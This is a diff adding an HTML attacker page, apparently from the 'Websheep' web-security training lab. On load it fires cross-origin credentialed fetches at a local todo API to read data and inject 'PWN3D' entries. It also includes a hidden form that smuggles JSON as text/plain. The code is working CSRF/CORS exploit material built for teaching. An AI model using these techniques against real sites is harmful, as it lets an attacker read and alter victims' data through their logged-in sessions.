@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Websheep</title>
+    <script>
+
+        class Attacker {
+
+            constructor() {
+                this._reporter = new Reporter();
+            }
+
+            attack() {
+
+                this._reporter.clear();
+
+                /*
+                 * Leaking data using CORS vulnerability.
+                 */
+                /* https://developer.mozilla.org/en/docs/Web/API/Fetch_API */
+                fetch('http://localhost:3000/csrf/v1/todos', {credentials: 'include'})
+                    .then(this._parseResponse)
+                    .then((data) => {
+                        this._reporter.addReport({
+                            data: data,
+                            title: 'CSRF leak with credentials',
+                            target: 'http://localhost:3000/csrf/v1/todos'
+                        });
+                    });
+
+                /*
+                 * Injecting data using CORS vulnerability.
+                 */
+                fetch('http://localhost:3000/csrf/v1/todos', {
+                    body: JSON.stringify({title: 'PWN3D!'}),
+                    credentials: 'include',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    method: 'POST'
+                })
+                    .then(this._parseResponse)
+                    .then((data) => {
+                        this._reporter.addReport({
+                            data: data,
+                            title: 'CSRF injection with credentials',
+                            target: 'http://localhost:3000/csrf/v1/todos'
+                        });
+                    });
+
+                /*
+                 * Injecting data using urlencoding.
+                 */
+                fetch('http://localhost:3000/csrf/v2/todos', {
+                    body: 'title=PWN3D-with-urlencoded-data!',
+                    credentials: 'include',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    },
+                    method: 'POST'
+                })
+                .catch(() => {
+                    this._reporter.addReport({
+                        data: {title: 'PWN3D-with-urlencoded-data!'},
+                        title: '(Maybe) CSRF injection with urlencoded data',
+                        target: 'http://localhost:3000/csrf/v2/todos'
+                    });
+                });
+
+                /*
+                 * Injecting data using text/plain media type.
+                 */
+                fetch('http://localhost:3000/csrf/v3/todos', {
+                    body: JSON.stringify({title: 'PWN3D with text/plain!'}),
+                    credentials: 'include',
+                    method: 'POST'
+                })
+                    .catch(() => {
+                        this._reporter.addReport({
+                            data: {title: 'PWN3D with text/plain!'},
+                            title: '(Maybe) CSRF injection with text/plain media type',
+                            target: 'http://localhost:3000/csrf/v3/todos'
+                        });
+                    });
+
+            }
+
+            _parseResponse(response) {
+
+                if (response.status >= 300) {
+                    throw new Error(`Unexpected status code ${response.status}`);
+                }
+
+                return response.json();
+
+            }
+
+        }
+
+        /* @todo Put your offensive code here. */
+        class Reporter {
+
+            addReport({data, target, title}) {
+
+                let element = document.createElement('div');
+
+                element.innerHTML = `
+<h2>${title}</h2>
+<div><b>Target: ${target}</b></div>
+<div><span>Data: </span><span id="wt-data"></span></div>
+`;
+
+                element.querySelector('#wt-data').textContent = JSON.stringify(data);
+
+                this._addReportElement({element});
+
+            }
+
+            clear() {
+                document.querySelector('#wt-report-output').innerHTML = '';
+            }
+
+            _addReportElement({element}) {
+                document.querySelector('#wt-report-output')
+                    .appendChild(element);
+            }
+
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+
+            let attacker = new Attacker();
+
+            attacker.attack();
+
+            document.querySelector('#wt-button-attack')
+                .addEventListener('click', () => attacker.attack());
+
+        });
+
+
+    </script>
+</head>
+<body>
+
+    <section>
+
+        <h1>Attacking...</h1>
+
+        <button id="wt-button-attack">ATTACK AGAIN</button>
+
+        <div id="wt-report-output"></div>
+
+    </section>
+
+    <section>
+
+        <h1>Form attacks</h1>
+
+        <!-- Some browsers forget to the add the Origin header when submitting a form. -->
+        <!-- https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/10482384/ -->
+        <form
+                action="http://localhost:3000/csrf/v3/todos"
+                enctype="text/plain"
+                method="POST"
+                target="_blank">
+
+            <input
+                    hidden
+                    name='{"title": "PWN3D with form", "extra": "'
+                    type="text"
+                    value='"}'>
+
+            <button type="submit">ATTACK V3 WITH FORM</button>
+
+        </form>
+
+    </section>
+
+</body>
+</html>
